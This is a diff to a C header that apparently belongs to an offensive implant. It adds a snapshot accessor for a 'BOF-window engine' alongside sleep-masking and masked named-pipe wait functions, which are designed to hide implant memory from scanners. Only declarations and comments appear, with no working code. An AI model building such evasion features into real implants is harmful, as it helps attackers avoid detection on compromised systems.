@@ -18,6 +18,12 @@
  */
 BOOL gen3_sleep(DWORD time);
 
+/* snapshot accessor for the BOF-window engine: fills out[] with the same
+ * block list gen3_sleep masks (header page + writable non-.text sections +
+ * tracked heap, g3 dedup rules) and, when text_span is non-NULL, writes the
+ * [RVA, RVA+size) of the first .text section into it. x86: returns 0. */
+int g3_snapshot_for_bofwin(G3_BLOCK * out, int max, DWORD * text_span);
+
 /* Phase 2 wait-window: masked blocking wait for the pipe channels. Masks
  * every gen3 block, calls ConnectNamedPipe through a pre-resolved pointer
  * (no API between mask and unmask), unmasks, returns TRUE when the wait
